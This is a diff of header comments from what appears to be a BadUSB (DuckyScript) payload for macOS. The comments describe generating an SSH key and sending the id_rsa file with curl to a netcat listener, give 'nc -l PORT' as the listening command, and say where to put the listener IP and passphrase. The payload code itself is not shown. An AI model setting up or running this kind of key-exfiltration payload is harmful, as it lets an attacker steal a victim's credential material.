@@ -5,10 +5,7 @@ REM  ssh and then it will make a id_rsa
 REM  which will be sent to netcat listener using curl
 REM  (usage: macOS)
 
-REM  Here I am defining the commands that I am going to be
-REM  using the most.
 REM  use nc -l PORT to listen
-REM  You will need to change line 25 and 81
 
 REM  you will need to put the ip for the listener and also the passphrase that you
 REM  want ssh to encrypt the id_rsa with.
@@ -21,7 +18,6 @@ REM  change "someonewashere" into the passphrase the id_rsa should use
 REM  In line 84 you add the netcat listener ip ex. 192.168.0.0:1337 
 REM [!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!][!]
 
-REM   if the delays are too long, then simple change them where it says - DEFINE COUPLE / WHILE / WAIT
 
 REM  ! Starting the script !
 
